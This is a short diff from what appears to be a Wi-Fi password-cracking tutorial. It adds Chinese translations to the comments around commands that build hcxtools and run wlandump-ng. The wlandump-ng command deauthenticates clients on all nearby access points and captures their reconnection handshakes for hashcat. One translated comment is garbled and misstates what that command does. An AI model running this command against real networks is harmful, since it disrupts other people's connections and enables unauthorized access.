@@ -86,13 +86,17 @@ git clone https://github.com/ZerBea/hcxtools
 cd hcxtools
 
 # build and install
+# 构建并且安装
 # you will likely need to apt install the required dependencies:
+# 你将可能需要apt来安装需要的依赖
 # https://github.com/ZerBea/hcxtools#requirements
 make
 sudo make install
 
 # blanket death connected clients from all nearby access points and listen for re-connections
+# 覆盖所有失去从附近接入点失去连接的客户端并且监听重新连接
 # replace wlan0 with your wireless device name
+# 将wlan0替换成你的无线设备名称
 wlandump-ng -i wlan0 -o capture.cap -c 1 -t 60 -d 100 -D 10 -m 512 -b -r -s 20 
 
 # once you've got a capture file, you can convert it to the hashcat capture format with
